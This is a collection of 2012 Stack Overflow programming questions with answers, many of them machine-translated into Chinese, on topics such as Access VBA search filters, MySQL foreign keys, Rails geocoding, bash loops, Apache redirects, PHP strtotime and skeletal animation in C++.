                    "FROM ([tbl_Studies:NR_Status] RIGHT JOIN ([tbl_Studies:Status] RIGHT JOIN tbl_Studies ON [tbl_Studies:Status].StatusID = tbl_Studies.Status) ON [tbl_Studies:NR_Status].NR_StatusID = tbl_Studies.NR_Status) LEFT JOIN [qry_General:FullName_FMLD] ON tbl_Studies.Investigator = [qry_General:FullName_FMLD].PersonID " & _
                    "WHERE "

        If Me.Join_Type <> 3 Then

            If Me.Join_Type = 1 Then
                JoinValue = "OR"
            ElseIf Me.Join_Type = 2 Then
                JoinValue = "AND"
            Else
                JoinValue = " "
            End If

    '--
            SearchStringTitle = "(("
            For Each varValue In SearchArray
                j = Trim(varValue)
                SearchStringTitle = SearchStringTitle & "(tbl_Studies.Study_Short_Title) Like ""*" & j & "*"""

                If varValue <> SearchArray(UBound(SearchArray)) Then
                    SearchStringTitle = SearchStringTitle & " " & JoinValue & " "
                End If
            Next varValue
            SearchStringTitle = SearchStringTitle & "))"

    '--
            SearchStringName = "(("
            For Each varValue In SearchArray
                j = Trim(varValue)
                SearchStringName = SearchStringName & "(tbl_Studies.Study_Name) Like ""*" & j & "*"""

                If varValue <> SearchArray(UBound(SearchArray)) Then
                    SearchStringName = SearchStringName & " " & JoinValue & " "
                End If
            Next varValue
            SearchStringName = SearchStringName & "))"

    '--
            SearchStringDescription = "(("
            For Each varValue In SearchArray
                j = Trim(varValue)
                SearchStringDescription = SearchStringDescription & "(tbl_Studies.Study_Description) Like ""*" & j & "*"""

                If varValue <> SearchArray(UBound(SearchArray)) Then
                    SearchStringDescription = SearchStringDescription & " " & JoinValue & " "
                End If
            Next varValue
            SearchStringDescription = SearchStringDescription & "))"

    '--
            SearchStringInvestigator = "(("
            For Each varValue In SearchArray
                j = Trim(varValue)
                SearchStringInvestigator = SearchStringInvestigator & "([qry_General:FullName_FMLD].FullName) Like ""*" & j & "*"""

                If varValue <> SearchArray(UBound(SearchArray)) Then
                    SearchStringInvestigator = SearchStringInvestigator & " " & JoinValue & " "
                End If
            Next varValue
            SearchStringInvestigator = SearchStringInvestigator & "))"

            SearchString = SearchStringTitle & " OR " & SearchStringName & " OR " & SearchStringDescription & " OR " & SearchStringInvestigator
        Else
            SearchStringTitle = "(((tbl_Studies.Study_Short_Title) Like ""*" & SearchString & "*""))"
            SearchStringName = "(((tbl_Studies.Study_Name) Like ""*" & SearchString & "*""))"
            SearchStringInvestigator = "((([qry_General:FullName_FMLD].FullName) Like ""*" & SearchString & "*""))"
            SearchStringDescription = "(((tbl_Studies.Study_Description) Like ""*" & SearchString & "*""))"

            SearchString = SearchStringTitle & " OR " & SearchStringName & " OR " & SearchStringDescription & " OR " & SearchStringInvestigator
        End If

        SearchString = SQLString & SearchString & ";"

        Me.ModifiedSearchValue.Value = SearchString
    End If
End Sub 
```

Again, my theory is that the hanging is caused by changing the RecordSource of the subform before it has finished loading from the previous search, but I can't seem to determine any workaround.

Thanks in advance for any and all insight/help!

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T03:25:13.857

根据 Olivier 的建议，问题的真正原因是 VBA 被作为查询的一部分调用`[qry_General:FullName_FMLD]`；切换到`[qry_General:FullName_FML]`（不调用任何 VBA）消除了所有问题。我猜问题的根源是表单试图在查询返回结果之前应用过滤器，从而创建损坏的过滤器字符串。

这是使用过滤器方法并用点替换所有刘海的更新代码：

```
Private Sub Search_Click()
    On Error GoTo Err_Search_Click

    Dim SearchString, SearchStringTitle, SearchStringName, SearchStringDescription, SearchStringInvestigator, JoinValue, j, SQLString As String, SearchArray, varValue As Variant

        Me.Results.Form.FilterOn = True
        SearchString = Trim(Me.SearchValue)

        If Not IsNull(SearchString) Then
            SearchArray = Split(SearchString, " ")

            If Me.Join_Type <> 3 Then

                If Me.Join_Type = 1 Then
                    JoinValue = "OR"
                ElseIf Me.Join_Type = 2 Then
                    JoinValue = "AND"
                Else
                    JoinValue = " "
                End If

        '--
                SearchStringTitle = "(("
                For Each varValue In SearchArray
                    j = Trim(varValue)
                    SearchStringTitle = SearchStringTitle & "(tbl_Studies.Study_Short_Title) Like ""*" & j & "*"""

                    If varValue <> SearchArray(UBound(SearchArray)) Then
                        SearchStringTitle = SearchStringTitle & " " & JoinValue & " "
                    End If
                Next varValue
                SearchStringTitle = SearchStringTitle & "))"

        '--
                SearchStringName = "(("
                For Each varValue In SearchArray
                    j = Trim(varValue)
                    SearchStringName = SearchStringName & "(tbl_Studies.Study_Name) Like ""*" & j & "*"""

                    If varValue <> SearchArray(UBound(SearchArray)) Then
                        SearchStringName = SearchStringName & " " & JoinValue & " "
                    End If
                Next varValue
                SearchStringName = SearchStringName & "))"

        '--
                SearchStringDescription = "(("
                For Each varValue In SearchArray
                    j = Trim(varValue)
                    SearchStringDescription = SearchStringDescription & "(tbl_Studies.Study_Description) Like ""*" & j & "*"""

                    If varValue <> SearchArray(UBound(SearchArray)) Then
                        SearchStringDescription = SearchStringDescription & " " & JoinValue & " "
                    End If
                Next varValue
                SearchStringDescription = SearchStringDescription & "))"

        '--
                SearchStringInvestigator = "(("
                For Each varValue In SearchArray
                    j = Trim(varValue)
                    SearchStringInvestigator = SearchStringInvestigator & "([qry_General:FullName_FML].FullName) Like ""*" & j & "*"""

                    If varValue <> SearchArray(UBound(SearchArray)) Then
                        SearchStringInvestigator = SearchStringInvestigator & " " & JoinValue & " "
                    End If
                Next varValue
                SearchStringInvestigator = SearchStringInvestigator & "))"

                SearchString = SearchStringTitle & " OR " & SearchStringName & " OR " & SearchStringDescription & " OR " & SearchStringInvestigator
            Else
                SearchStringTitle = "(((tbl_Studies.Study_Short_Title) Like ""*" & SearchString & "*""))"
                SearchStringName = "(((tbl_Studies.Study_Name) Like ""*" & SearchString & "*""))"
                SearchStringInvestigator = "((([qry_General:FullName_FML].FullName) Like ""*" & SearchString & "*""))"
                SearchStringDescription = "(((tbl_Studies.Study_Description) Like ""*" & SearchString & "*""))"

                SearchString = SearchStringTitle & " OR " & SearchStringName & " OR " & SearchStringDescription & " OR " & SearchStringInvestigator
            End If

            Me.Results.Form.Filter = SearchString
        End If

    Exit_Search_Click:
        Exit Sub

    Err_Search_Click:
        MsgBox ("There are no active records to review.")
        Resume Exit_Search_Click
End Sub 
```

再次，此解决方案的功劳属于 Olivier Jacot-Descombes - 感谢您的所有帮助和建议！

# mysql - Creating Relationship in MySQL error

> ID：13093827
> 
> 赞同：1
> 
> 时间：2012-10-26T20:16:48.370
> 
> 标签：mysql, foreign-keys, foreign-key-relationship, mysql-error-1005

I have three tables (all InnoDB with primary keys having int(7) for type)

tblcustomers: primary key is customer_id

tblorders: primary key is order_id (has field for customer_id called order_customer)

tblorder_detail: primary key is order_detail_id (has field for order_id called order_id)

I want a to create a relationship so that deleting a customer deletes their order history.

I used the following statement to alter the Orders table:

```
ALTER TABLE `tblorders`
  ADD CONSTRAINT `FK_myKey` FOREIGN KEY (`order_customer`) REFERENCES `tblcustomers` (`customer_id`) ON DELETE CASCADE ON UPDATE CASCADE; 
```

This was successful and deleting a customer deletes their associated orders.

I then tried the following and I get an error:

```
ALTER TABLE `tblorder_detail`
  ADD CONSTRAINT `FK_myKey` FOREIGN KEY (`order_id`) REFERENCES `tblorders` (`order_id`) ON DELETE CASCADE ON UPDATE CASCADE 
```

This is the error (wtc-ecommerce is the name of the db):

1005 - Can't create table 'wtc-ecommerce.#sql-5d2_c2' (errno: 121)

Reading through other SO posts, seems like everything is correctly configured, so I'm lost.

Thanks

# javascript - code javascript quick answer

> ID：13093832
> 
> 赞同：-6
> 
> 时间：2012-10-26T20:17:20.267
> 
> 标签：javascript, for-loop

Why doesn't it work? I am trying now for a long time and there seem to be no end to it. Need to make it simple as possible

```
var firstInput = document.luckForm.numberBox.value;
 var secondInput = document.luckForm.numberBox2.value;
 var thirdInput = document.luckForm.numberBox3.value;

for (firstInput = 0; firstInput <= 10; firstInput++) {
if (firstInput = luckyNumber) {
if (secondInput = luckyNumber2) {
if (thirdInput = luckyNumber3) {

{alert('Congratulations! You got all 3 numbers correct. You\'ve won £1000!'); }}}}} 
```

I was trying to change this code (see below) into a for loop code, very simple with no arrays. I am not sure how I can do this. It is supposed to be for a lottery, you can type in three numbers and if they are correct you would get the message that you win 1000 pounds.

```
if (firstInput == luckyNumber && secondInput == luckyNumber2 && thirdInput == luckyNumber3 || firstInput == luckyNumber && secondInput == luckyNumber3 && thirdInput == luckyNumber2 || firstInput == luckyNumber2 && secondInput == luckyNumber3 && thirdInput == luckyNumber || firstInput == luckyNumber2 && secondInput == luckyNumber && thirdInput == luckyNumber3 || firstInput == luckyNumber3 && secondInput == luckyNumber && thirdInput == luckyNumber2 || firstInput == luckyNumber3 && secondInput == luckyNumber2 && thirdInput == luckyNumber)
    {
        alert('Congratulations! You got all 3 numbers correct. You\'ve won £1000!'); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T20:19:26.237

您正在*分配*而不是*比较*。

```
firstInput = luckyNumber 
```

应该：

```
firstInput == luckyNumber 
```

或者更好：

```
parseInt(firstInput, 10) === luckyNumber 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T23:58:23.103

这里不需要 FOR 循环。这些数字输入一次，然后与幸运数字进行核对。无需遍历循环并一遍又一遍地检查相同的数字。

如果您想循环获取数字的整个过程，然后将这些数字与幸运数字进行比较，如果它们不匹配则重复，您应该使用 DO-WHILE 循环。

做 - 获取数字并将它们与幸运数字核对。

WHILE - 数字不等于幸运数字。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T23:57:55.130

看起来该声明只是试图确保顺序无关紧要。因此，如果您将第一个号码放在第二个盒子中，将第二个号码放在第一个盒子中，但仍然得到与乐透相同的三个号码，您仍然会赢。

（即如果结果为 15、23、35，则为 23、35、15 胜）

# ruby-on-rails - geocoder: distance sortable index

> ID：13093833
> 
> 赞同：4
> 
> 时间：2012-10-26T20:17:24.113
> 
> 标签：ruby-on-rails, oop, geocoding, rails-geocoder

I'm developing a rails app where `Users` are having many `Items`. The users are geocoded thanks to another model I called `Place` that is relying on the ruby geocoder gem.

```
class Place < ActiveRecord::Base
    attr_accessible :street_number, :street, :city, :postal_code, :country, :latitude, :longitude

    belongs_to :placable, :polymorphic => true
    geocoded_by :address
    after_validation :geocode

    def address
       [street_number, street, postal_code, city, country].compact.join(', ')
   end
 end 
```

In the user model, I delegated methods from the `Place` model to be able to access them directly at the user level.

```
class User < ActiveRecord::Base
  has_many :items, :dependent => :destroy
  has_one  :place, :as => :placable, :dependent => :destroy
  accepts_nested_attributes_for :place
  attr_accessible :place_attributes

  geocoded_by :address
  delegate :address, :to => :place, :allow_nil => true
  delegate :latitude, :to => :place, :allow_nil => true
  delegate :longitude, :to => :place, :allow_nil => true
  #...
end 
```

The same trick is used at the items level:

```
class Item < ActiveRecord::Base
  belongs_to :user

  # place
  geocoded_by :address
  delegate :place, :to => :user, :allow_nil => true 
  delegate :address, :to => :user, :allow_nil => true
  delegate :latitude, :to => :user, :allow_nil => true
  delegate :longitude, :to => :user, :allow_nil => true
  # ...
end 
```

Now I'd like to set up an index on items such that they are sorted by distance to the current user. I don't find a design to perform the task in this setup.

I tried to do the following with the delegation of the `near` method from geocoder on the `User` model and the `Item`model but the sql query fails complaining that `latitude` and `longitude` are not columns of the `items` table. This is actually correct but I wish to access the ones in the `places`table instead.

```
 # this added to the user model:
  delegate :near :to => :place
  # this added to the item model:
  delegate :near :to => :user

  class ItemsController < ApplicationController

    def index
       @items=Item.near(current_user.place, params[:distance]).paginate(:per_page => 20, :page => params[:page_name])
    end
  end 
```

I would like to avoid the solution where both users and items are having attributes for geocoding (latitude, longitude, address, etc.).

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-09-25T11:50:32.407

我不知道这对我来说是太明显还是我错了，但请允许我尝试：

我只需创建一个列（例如，位置 - 在项目模型处）来保存项目的当前位置，然后将其与当前用户位置进行比较。

不是你要找的吗？希望我有帮助！

# c++ - Generate poisson Arrival date using C++ and boost

> ID：13093835
> 
> 赞同：2
> 
> 时间：2012-10-26T20:17:28.777
> 
> 标签：c++, boost, poisson

I'm doing a simulation program of a transport network. I want to simulate an arrival of passengers in a bus station that have a poison distribution of rate lambda.

In fact, in my conception of the program I need two lists of arrival dates: the first one is considered as the expected arrival dates for passengers and the second will be considered as the real effective arrival of passengers.

For generating time arrival I did use the following code using boost:

```
<blink>

  double lambda(Lambda1);  //mean of Poisson distr 
  boost::mt19937 rnd_gen;   //Mersenne Twister generator 

  typedef boost::variate_generator< 
      boost::mt19937, boost::poisson_distribution<> 
  > rnd_poisson_t; 

  rnd_poisson_t rnd_poisson( rnd_gen, 
    boost::poisson_distribution<>( lambda ) ); 

  rnd_poisson = rnd_poisson_t( rnd_gen, 
  boost::poisson_distribution<>( lambda ));      

  for(int i = 0; i <size;i++) 
  { 
      value=rnd_poisson();       
      tab[i]= rnd_poisson(); 
      i++;    
  } 

</blink> 
```

The problem is if I use this code for different lists to generate the arrivals dates for the same Lambda and the same list size it will always generate the same numbers.

How do I to create a certain variation in this generation so that the two generated lists will be a little bit different?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T22:35:33.190

每当您使用它时，用当前时间重新播种随机生成器。大多数情况下，这将产生不同的序列。如您所见：

```
rnd_gen(static_cast<unsigned int>(std::time(0))); 
```

# asp.net-mvc - Add/pass new field to MVC Membership CreateUser

> ID：13093839
> 
> 赞同：0
> 
> 时间：2012-10-26T20:17:48.550
> 
> 标签：asp.net-mvc, asp.net-membership

Developing MVC4 application and using Register that comes with MVC5 framework. I updated `register.cshtml` and added a new column called `Language`. I also updated the `RegisterModel` class to hold my value. Register model has all the values including my property (language).

Now I like to grab this values from Register Model and plug into `CreateUser`.

MyProperty is model.Language

```
[HttpPost]
publıc ActıonResult Register(RegisterModel model)
{
    Membership.CreateUser(model.UserName, model.Password, model.Email, null, null, true, Guid.NewGuid(), out status)
} 
```

What would be the best way to grab this value and store in database? I really like to store in `Users` table where `UserID` and `UserName` exists.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T04:22:29.000

`WebSecurity.CreatUserAndAccount`诀窍是通过调用传递附加列的语法。尝试这个：

```
WebSecurity.CreateUserAndAccount(model.UserName,model.Password,
new {Language = model.Language
}); 
```

[这里](http://blog.longle.net/2012/09/25/seeding-users-and-roles-with-mvc4-simplemembershipprovider-simpleroleprovider-ef5-codefirst-and-custom-user-properties/#comment-408)有完整的描述。

# bash - 重复指令bash脚本

> ID：13093840
> 
> 赞同：0
> 
> 时间：2012-10-26T20:17:51.747
> 
> 标签：bash, loops, scripting

这很容易是任何语言......但我现在正在使用 bash。我正在寻找可以跨语言复制的背后的理解。

所以...

我正在将一个文件复制到目录树上，而不是用另一个文件替换该文件。

```
 cp "$DIR"/folder2/file2 "$DIR";
     mv "$DIR"/folder1/file1 "$DIR"/folder2/file2; 
```

然后我把复制的文件移到另一个文件夹中……开始同样的舞蹈。

```
 cp "$DIR"/folder3/file3 "$DIR";
     mv "$DIR"/file2 "$DIR"/folder3/file3 
```

我想这样做 100 次以上。

什么是最优雅的方式？

优雅，简明扼要，别人可以理解。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-26T20:25:36.903

```
for i in {1..100}; do
    j=$((i+1))

    cp "$DIR"/folder$j/file$j "$DIR"
    mv "$DIR"/folder$i/file$i "$DIR"/folder$j/file$j
done 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-28T04:17:37.650

您正在尝试：

1.  备份文件 B.
2.  将文件 A 重命名（或移动）为文件 B。
3.  备份文件 C.
4.  将文件 B 的备份重命名为文件 C。
5.  备份文件 D.
6.  将文件 C 的备份重命名为文件 D。

等等。

倒退实际上更容易，因此您只需要备份最后一个文件。

```
last=100
mv "$DIR/folder$last/file$last" "$DIR"
for i in $(seq $last -1 2); do
  mv "$DIR/folder$((i-1))/file$((i-1))" "$DIR/folder$i/file$i"
done 
```

笔记：

*   `seq $last -1 2`生成从`$last`到`2`递增的数字序列`-1`。
*   我正在使用`seq`而不是大括号扩展，因为后者不会在您拥有时扩展数字`{$last .. 1}`

# iphone - Integrate iAd in UITableView with static cells

> ID：13093842
> 
> 赞同：2
> 
> 时间：2012-10-26T20:17:56.343
> 
> 标签：iphone, objective-c, uitableview

I want to be able to integrate an iAd into the detail view of my master detail application. The detail view is a UITableView with a static table displaying some data. All of the tutorials I've found on the Internet put the iAd at the bottom of the table by using a UIView containing a UITableView. Unfortunately, I can't do that because a static table must be in a UITableView. So I'm stuck. Since this is more of a conceptual problem, I don't really have any code to post, but if you tell me what to post I can. Thanks in advance, Brad. :)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:40:02.213

我总是将这段代码插入到Did Load视图中，它将iad放在最上面。看看这是否有效，如果您需要整套 .h 和 .m 文件，请告诉我，我会为您发布。

```
adView = [[ADBannerView alloc] initWithFrame:CGRectZero];
adView.frame = CGRectOffset(adView.frame, 0, -50);
adView.requiredContentSizeIdentifiers = [NSSet setWithObjects:ADBannerContentSizeIdentifierPortrait,ADBannerContentSizeIdentifierLandscape,nil];
if (UIInterfaceOrientationIsLandscape(self.interfaceOrientation)) {
    adView.currentContentSizeIdentifier = ADBannerContentSizeIdentifierLandscape;
}else
{
    adView.currentContentSizeIdentifier = ADBannerContentSizeIdentifierPortrait;
}
[self.view addSubview:adView];
adView.delegate=self;
self.bannerIsVisible=NO; 
```

我希望它有所帮助，如果您需要整套代码，请告诉我。阿德里安

这是一个教程的链接，它完全符合您的要求，那里还有一个示例项目向您展示它是如何工作的。

[http://useyourloaf.com/blog/2010/09/16/placing-iad-banners-at-the-top-of-a-table-view.html](http://useyourloaf.com/blog/2010/09/16/placing-iad-banners-at-the-top-of-a-table-view.html)

# client-server - http streaming TO server FROM client (mobile device)

> ID：13093846
> 
> 赞同：0
> 
> 时间：2012-10-26T20:18:15.210
> 
> 标签：client-server, http-streaming

I know it's possible to stream content from a server to a web browser. I'm curious if there is a method to allow the same in reverse; and once a page is requested/connection established to then try and keep it open and stream content to the server from the client without continually re-initiating a connection/POSTing to the server. I have tried searching for such a thing but I always find information about http streaming from server to client and not the other way around. This is specifically to target mobile devices and stream chunks of text up to the server.

Thanks in advance for any info or advice!

# php - 将类添加到子菜单之前的链接，而不是之前的列表项

> ID：13093847
> 
> 赞同：0
> 
> 时间：2012-10-26T20:18:15.953
> 
> 标签：php, wordpress

我正在寻找几乎与此功能在 Wordpress 中完全相同的功能：

```
add_filter('wp_nav_menu_objects', function ($items) {
    $hasSub = function ($menu_item_id, &$items) {
        foreach ($items as $item) {
            if ($item->menu_item_parent && $item->menu_item_parent==$menu_item_id) {
                return true;
             }
         }
         return false;
     };

     foreach ($items as &$item) {
         if ($hasSub($item->ID, &$items)) {
             $item->classes[] = 'menu-parent-item'; // all elements of field "classes" of a menu item get join together and render to class attribute of <li> element in HTML
         }
     }
     return $items;    
 }); 
```

这个方便的函数将一个类“menu-parent-item”附加到包含子菜单的 li。我想做的是事先将相同的类（或任何其他可用的类）添加到链接中。换句话说，我最终会这样：

```
<li>
    <a href="index.php" class="menu-parent-item">Homepage</a>
    <ul class="sub-menu">
        <li> 
```

等等。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-27T00:11:11.467

你总是可以使用 jQuery

`$('ul.sub-menu').parent().addClass('menu-parent-item');`

**编辑：**好吧，通过您的编辑，您可以使用该[`prev()`](http://api.jquery.com/prev/)方法吗？

`$('ul.sub-menu').prev().addClass('menu-parent-item');`

# android - 几个设备上的视口奇怪 - 无论操作系统 + 方向如何，任何可靠的方法都可以在初始输入时显示 100% 宽度？

> ID：13093848
> 
> 赞同：0
> 
> 时间：2012-10-26T20:18:22.760
> 
> 标签：android, ios, landscape, viewport, portrait

我们有以下视口元标记：

```
<meta name="viewport" content="width=1024, initial-scale=1.0"/> 
```

以下是网站进入时发生的情况的细分：

iPad + iOS 6.0 + 横向 = 正确

ipad + iOS 6.0 + Portrait = 与横向相同的“缩放级别”，因此显示了大约 65% 的宽度，其余的需要滚动。

Android 4.0 Galaxy S3 + 内置浏览器 + 横向 = 放大到真正接近，显示大约 60% 的宽度，其余需要滚动。

Android 4.0 Galaxy S3 + 内置浏览器 + 人像 = 近距离放大，显示大约 60% 的宽度，其余需要滚动。

Android 4.0 Galaxy S3 + Chrome（已下载 Play 商店）浏览器 + 横向 = 放大得更近，最初只显示大约 45% 的宽度。

Android 4.0 Galaxy S3 + Chrome（已下载 Play 商店）浏览器 + 肖像 = 放大得更近，最初只显示大约 50% 的宽度。

Android 4.0 Tab 10.1 + Landscape = 正确

Android 4.0 Tab 10.1 + Portrait =与横向相同的缩放级别，因此效果几乎与ipad + Portrait相同。

是否有任何跨浏览器可靠的方式让页面显示 100% 的宽度，而不管方向/ios/android 是什么？

我是否正确假设无论上述所有情况如何，移动设备都倾向于“记住”每个域级别的缩放级别？

我们是否错误地使用了视口元标记？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T21:10:12.883

简短的回答是，对于任何具有 Javascript 内容的页面，您无法保证它的外观。浏览器有不同的 Javascript 引擎，支持不同的标签等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-27T22:51:34.187

我们发现，通过`viewport`完全删除元标记，上述所有案例都开始正确显示……在初始输入时以 100% 宽度显示。

# php - 我如何为这个变量做一个时间字符串。可能吗？

> ID：13093850
> 
> 赞同：0
> 
> 时间：2012-10-26T20:18:28.547
> 
> 标签：php, strtotime

只是想知道是否有人可以帮助我解决这个问题。有没有办法用这个变量做一个适当的 strtotime ？

```
$var = "Thursday October 26 2012 12:59:59 PM"; 
```

当我执行 a`strtotime`时，它显示为 1351789199。但是当我将 var 更改为：

```
$var = "Thursday October 26 2012 12:59:50 PM"; 
```

它仍然显示与`strtotime`1351789199 相同。

有什么想法吗？$var 存储在数据库中，因此除非我使用另一个函数使它看起来不同，否则我无法更改它。

提前感谢专家！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:22:48.073

这似乎不对。我得到不同的时间。请记住，我的时区不同，但至少值略有不同。

```
<?php
header('Content-Type: text/plain');

$time = time();

$var = "Thursday October 26 2012 12:59:59 PM";

echo strtotime($var, $time).PHP_EOL;

$var = "Thursday October 26 2012 12:59:50 PM";

echo strtotime($var, $time).PHP_EOL;

?> 
```

## 输出

```
1351799999
1351799990 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:39:57.860

超级奇怪，但出于某种原因，Chrome 似乎已经缓存了信息？我不认为你可以缓存时间，但它在 Firefox 中运行良好。感谢大家的快速回复。

# apache - 将下载目录重定向到子域

> ID：13093851
> 
> 赞同：1
> 
> 时间：2012-10-26T20:18:48.813
> 
> 标签：apache, .htaccess, redirect

我的下载脚本结构是：

```
http://www.mysite.com/download/viewdownload/**/** 
```

现在我想移动并重定向到子域

例如

重定向

```
http://www.mysite.com/download/viewdownload/61/4249
 to
http://www.alt.mysite.com/download/viewdownload/61/4249 
```

或者

```
http://www.mysite.com/download/viewdownload/53/824
 to
http://www.alt.mysite.com/download/viewdownload/53/824 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T21:49:45.970

您可以使用任一 mod_alias：

```
Redirect /download/viewdownload http://www.alt.mysite.com/download/viewdownload 
```

在主机的文档根目录中的 vhost config 或 htaccess 中`www.mysite.com`，或使用 mod_rewrite：

```
RewriteEngine On
RewriteCond %{HTTP_HOST} ^(www\.)?mysite\.com$ [NC]
RewriteRule ^/?download/viewdownload/(.*)$ http://www.alt.mysite.com/download/viewdownload/$1 [L,R] 
```

# c++ - 骨骼动画

> ID：13093852
> 
> 赞同：2
> 
> 时间：2012-10-26T20:18:51.637
> 
> 标签：c++, skinning, skeletal-mesh

我是骨骼动画术语的新手，我已经读过，要使用骨骼动画网格，我必须使用骨骼层次结构，我在场景图中制作每个骨骼节点，然后使网格变形我必须在插值之前获得骨骼的逆绝对矩阵（我相信这就是他们所说的姿势）乘以骨骼的插值绝对矩阵以获得过渡矩阵和变形网格我必须将顶点乘以过渡矩阵乘以权重，并将所有这些结果与使同一顶点变形的任何其他骨骼相加。

为了更具体地获得每块骨头的绝对值，我这样做了

```
void CNode::update()
{
   if(this->Parent!=null)
      absMatrix = this->Parent->absMatrix * relativeMatrix;
   else
     absMatrix = RelativeMatrix;

   for(int n=0; n<childs.count; n++)
   {
      childs[n]->update();
   }
} 
```

现在我得到了这个 absMatrix 矩阵的逆矩阵，在任何只改变 relativeMatrix 一次的插值之前，做顶点变形就是这个函数

```
void CMesh::skinMesh(){
     CVec3 vec;
     for(int n=0; n < vertex.count; n++)
     {        
        vec.clear();
        for(int i=0; i < vertex[n].weight.count && vertex[n].bindBone[i] ; i++)
        {
            vec+= vertex[n].vec * vertex[n].bindBone[i]->transitionMatrix * vertex[n].weight[i];
        }
        outVertex[n] = vec;
} 
```

现在这对我不起作用，因为每个顶点都围绕网格轴的中心旋转，而不是围绕使顶点变形的骨骼的父骨骼，考虑到 transition = InverAbs *absoulteMatrix 会让我得到数量，我认为这是合乎逻辑的旋转骨骼由于插值而获得增益，因此假设它旋转 20 度，顶点将从顶点原点旋转 20 度，所以我想我缺少一些东西来使顶点围绕正在变形它们的骨骼的父级旋转，请帮我。

所以这就是我做插值的方式，不是对绝对矩阵而是对relativeMatrix，我更新绝对值的代码就是上面的那个。

```
//CAnimateObject is a decendent class of CNode
void CAnimateObject::UpdateFrame(unsigned AniNum, float Time)
    {
        float fInterp;

        if(m_AniCount > AniNum)
        {
            CKeyFrame *CurAni = &Ani[ AniNum ];
            if(CurAni->Pos.list.count>0)
            {
                CFrame<CVector3>::CKEY *begin, *end;

                if( CurAni->Pos.getBetweenKeys(&begin, &end, Time, fInterp)){
                    m_Pos.x = begin->Object->x + (end->Object->x - begin->Object->x) * fInterp;
                    m_Pos.y = begin->Object->y + (end->Object->y - begin->Object->y) * fInterp;
                    m_Pos.z = begin->Object->x + (end->Object->z - begin->Object->z) * fInterp;
                }
            }
            if(CurAni->Scale.list.count>0)
            {
                CFrame<CVector3>::CKEY *begin, *end;
                if( CurAni->Scale.getBetweenKeys(&begin, &end, Time, fInterp)){
                    m_Scale.x = begin->Object->x + (end->Object->x - begin->Object->x) * fInterp;
                    m_Scale.y = begin->Object->y + (end->Object->y - begin->Object->y) * fInterp;
                    m_Scale.z = begin->Object->x + (end->Object->z - begin->Object->z) * fInterp;
                }
            }
            if(CurAni->Rot.list.count > 1)
            {
                CFrame<CQuaternion>::CKEY *begin, *end;

                if( CurAni->Rot.getBetweenKeys(&begin, &end, Time, fInterp)){
                    m_Qrel.SLERP(*begin->Object, *end->Object, fInterp);
                }
            }else
                if(CurAni->Rot.list.count==1)
                    m_Qrel = *(CQuaternion*)CurAni->Rot.list.start[0].Object;
        }
                CMatrix4 tm, scale;
    scale.identity();
    tm.identity();
    scale.Scale(m_Scale.Get());
    tm.fromQuaternion(m_Qrel);
    m_Rel = tm * scale;
    m_Rel.Translate(m_Pos);

    } 
```

是的，我这样做了，并将骨骼乘以它的逆绝对值，然后乘以绝对矩阵，它工作得很好，但是很多乘法正在发生，比如。

```
//inversePose is the absoluteMatrix before applying the interpolation of the relative matrix
void CMesh::skinMesh(){
     CVec3 vec;
     for(int n=0; n < vertex.count; n++)
     {            
        outVertex[n].clear();
        for(int i=0; i < vertex[n].weight.count && vertex[n].bindBone[i] ; i++)
        {
            vec = vertex[n].vec3 * vertex[n].bindBone[i]->inversePose; 
            vec = vec * vertex[n].bindBone[i]->absMatrix * vertex[n].weight[i];
            outVertex[n]+= vec;
        }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-02T19:28:12.193

代码现在正在运行，看起来我的矩阵乘法顺序错误，因为它像 inverPose * absoluteMatrx 那样做，现在是错误的，它是 absoluteMatrx * inverPose 并且工作正常

# php - 按钮调用函数而不被点击

> ID：13093860
> 
> 赞同：-2
> 
> 时间：2012-10-26T20:19:15.453
> 
> 标签：php, html, button

我有一个按钮，它是一个 php 函数，但是无论按钮是否被单击，它总是调用该函数。

```
 <FORM>
            <INPUT TYPE="button"  VALUE="Dismiss" onClick="'.$this->dismiss_IE().'">
            </FORM> 
```

在加载时，我在dismiss_IE() 函数中放置了一个回显，该函数将显示并加载每个页面。

单击按钮时如何仅调用dismiss_IE函数。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:22:27.873

不幸的是，您不能在 onclick 事件中调用 PHP 函数。一旦服务器读取您的 PHP 代码，它就会被评估..

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:25:07.427

你的代码有问题。作为@Mr. Alien 说，你正在尝试调用一个 php 函数，它应该是一个 javascript 函数。

```
<script language = "javascript">
function dismiss_IE() {
        //write javascript code instead of php
        //if you have php logics, try to use ajax to 
        // call the php page and write your logis there.
}
</script>
<form>
<input type="button"  value="Dismiss" onClick="dismiss_IE()">
</form> 
```

# javascript - 让多个页面互相交谈

> ID：13093862
> 
> 赞同：3
> 
> 时间：2012-10-26T20:19:25.360
> 
> 标签：javascript, html, browser

我正在编写一个需要打开多个选项卡/网页的 Web 应用程序。我希望他们互相交谈。而且我不希望页面与服务器对话。那么 HTML5/JS 有可能吗？顺便说一句，它们都在同一个域名上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-27T01:14:35.513

我从来没有遇到过使用浏览器选项卡功能作为导航方式的 web 应用程序。我不想说这是错误的，因为我不知道您的特殊要求，当然，我还没有玩过世界上的每一个 webapp。

但是，在您的 Web 应用程序中实现自己的选项卡系统是否比依赖浏览器的功能更有意义，该功能可能实现不一致并且可能受用户个人设置的影响？

